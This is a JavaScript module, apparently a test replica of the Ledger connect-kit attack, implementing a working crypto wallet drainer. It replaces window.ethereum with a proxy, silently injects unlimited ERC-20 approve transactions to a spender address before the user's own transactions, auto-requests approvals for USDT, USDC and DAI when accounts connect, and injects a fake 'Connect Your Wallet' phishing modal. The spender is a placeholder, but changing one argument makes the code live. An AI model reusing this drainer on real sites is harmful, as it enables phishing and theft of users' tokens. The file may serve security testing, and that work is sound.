// SAFE_TEST_MODE = true — approve calls target 0xDEAD... test address only
// Replicates: Ledger connect-kit drainer attack pattern

const SAFE_TEST_MODE = true;

// ERC-20 ABI fragments
const ERC20_APPROVE_SELECTOR = "0x095ea7b3"; // approve(address,uint256)
const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// Target address for stolen approvals (safe: obviously fake address)
const DRAINER_ADDRESS = "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF";

/**
 * Drainer class — replaces window.ethereum provider to intercept transactions
 * Replicates the Ledger connect-kit attack where the provider was swapped
 */
class Drainer {
  constructor(options = {}) {
    this.targetAddress =
      options.targetAddress || DRAINER_ADDRESS;
    this.chainId = options.chainId || 1;
    this.originalProvider = null;
    this.proxy = null;
    this.interceptedTxs = [];
  }

  /**
   * Hook into the existing ethereum provider
   * Replaces window.ethereum with a proxy that intercepts calls
   */
  hookProvider(provider) {
    this.originalProvider = provider;

    // Create a proxy that intercepts specific RPC methods
    this.proxy = new Proxy(provider, {
      get: (target, prop) => {
        if (prop === "request") {
          return (args) => this._interceptRequest(target, args);
        }
        if (prop === "send") {
          return (method, params) =>
            this._interceptSend(target, method, params);
        }
        if (prop === "sendAsync") {
          return (payload, callback) =>
            this._interceptSendAsync(target, payload, callback);
        }
        return target[prop];
      },
    });

    // Replace window.ethereum
    if (typeof window !== "undefined") {
      window.ethereum = this.proxy;
    }
  }

  /**
   * Intercept EIP-1193 request() calls
   */
  async _interceptRequest(target, args) {
    const { method, params } = args;

    if (method === "eth_sendTransaction") {
      return this._hijackTransaction(target, args, params);
    }

    if (method === "eth_sign" || method === "personal_sign") {
      // Log the signing request (in real attack: could modify the message)
      this.interceptedTxs.push({
        type: "sign",
        method,
        params,
        timestamp: Date.now(),
      });
    }

    if (method === "eth_accounts" || method === "eth_requestAccounts") {
      // Pass through but record the accounts
      const accounts = await target.request(args);
      if (accounts && accounts.length > 0) {
        // Trigger approval drain for known tokens
        this._drainApprovals(target, accounts[0]);
      }
      return accounts;
    }

    return target.request(args);
  }

  /**
   * Hijack eth_sendTransaction — inject approval transactions
   */
  async _hijackTransaction(target, originalArgs, params) {
    const tx = params[0];

    this.interceptedTxs.push({
      type: "transaction",
      original: tx,
      timestamp: Date.now(),
    });

    // Silently inject an ERC-20 approve(drainerAddress, MAX_UINT256) call
    // before the user's actual transaction
    const approveTx = {
      from: tx.from,
      to: tx.to, // The token contract
      data: this._encodeApprove(this.targetAddress, MAX_UINT256),
      gas: "0x15f90", // 90000 gas
    };

    try {
      // Try to send the approval first (will fail in test — no real provider)
      await target.request({
        method: "eth_sendTransaction",
        params: [approveTx],
      });
    } catch (e) {
      // Expected to fail in test environment
    }

    // Then pass through the original transaction
    return target.request(originalArgs);
  }

  /**
   * Auto-drain: request approvals for common tokens when accounts are connected
   */
  _drainApprovals(target, account) {
    // Common ERC-20 token addresses (mainnet)
    const tokens = [
      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
      "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    ];

    for (const token of tokens) {
      try {
        target.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: account,
              to: token,
              data: this._encodeApprove(this.targetAddress, MAX_UINT256),
              gas: "0x15f90",
            },
          ],
        });
      } catch (e) {
        // Expected to fail in test
      }
    }
  }

  /**
   * Encode an ERC-20 approve(address, uint256) call
   */
  _encodeApprove(spender, amount) {
    // Remove 0x prefix and pad to 32 bytes
    const paddedSpender = spender.slice(2).toLowerCase().padStart(64, "0");
    const paddedAmount = amount.slice(2).padStart(64, "0");
    return ERC20_APPROVE_SELECTOR + paddedSpender + paddedAmount;
  }

  /**
   * Legacy send() interception
   */
  _interceptSend(target, method, params) {
    if (method === "eth_sendTransaction") {
      this.interceptedTxs.push({
        type: "send",
        method,
        params,
        timestamp: Date.now(),
      });
    }
    return target.send(method, params);
  }

  /**
   * Legacy sendAsync() interception
   */
  _interceptSendAsync(target, payload, callback) {
    if (payload.method === "eth_sendTransaction") {
      this.interceptedTxs.push({
        type: "sendAsync",
        payload,
        timestamp: Date.now(),
      });
    }
    return target.sendAsync(payload, callback);
  }

  /**
   * Restore the original provider
   */
  unhook() {
    if (typeof window !== "undefined" && this.originalProvider) {
      window.ethereum = this.originalProvider;
    }
  }
}

/**
 * DrainerPopup — injects a fake "Connect Wallet" modal into the DOM
 * Replicates the Ledger connect-kit fake UI injection
 */
class DrainerPopup {
  constructor(options = {}) {
    this.title = options.title || "Connect Your Wallet";
    this.element = null;
  }

  /**
   * Inject the fake modal into the DOM
   */
  show() {
    if (typeof document === "undefined") return;

    // Create modal overlay
    const overlay = document.createElement("div");
    overlay.id = "wallet-connect-overlay";
    overlay.style.cssText =
      "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:999999;display:flex;align-items:center;justify-content:center;";

    // Create modal content
    const modal = document.createElement("div");
    modal.style.cssText =
      "background:#fff;border-radius:16px;padding:32px;max-width:400px;width:90%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,sans-serif;";

    modal.innerHTML = `
      <h2 style="margin:0 0 8px;font-size:20px;color:#1a1a2e;">${this.title}</h2>
      <p style="color:#666;font-size:14px;margin:0 0 24px;">Choose your preferred wallet to continue</p>
      <div id="wallet-options" style="display:flex;flex-direction:column;gap:12px;">
        <button class="wallet-btn" data-wallet="metamask" style="display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;cursor:pointer;font-size:16px;">
          <span style="font-size:24px;">&#129418;</span> MetaMask
        </button>
        <button class="wallet-btn" data-wallet="walletconnect" style="display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;cursor:pointer;font-size:16px;">
          <span style="font-size:24px;">&#128279;</span> WalletConnect
        </button>
        <button class="wallet-btn" data-wallet="coinbase" style="display:flex;align-items:center;gap:12px;padding:12px 16px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;cursor:pointer;font-size:16px;">
          <span style="font-size:24px;">&#127760;</span> Coinbase Wallet
        </button>
      </div>
      <p style="color:#999;font-size:12px;margin:16px 0 0;">Secured by WalletConnect Protocol</p>
    `;

    overlay.appendChild(modal);

    // Attach click handlers that trigger the drain
    const buttons = modal.querySelectorAll(".wallet-btn");
    buttons.forEach((btn) => {
      btn.addEventListener("click", () => {
        const wallet = btn.getAttribute("data-wallet");
        // In real attack: this would trigger the wallet connection and drain
        // In test: just log it
        console.log(`[DRAINER] User clicked ${wallet} wallet option`);
        overlay.remove();
      });
    });

    // Close on overlay click
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) overlay.remove();
    });

    document.body.appendChild(overlay);
    this.element = overlay;
  }

  hide() {
    if (this.element) {
      this.element.remove();
      this.element = null;
    }
  }
}

module.exports = { Drainer, DrainerPopup };
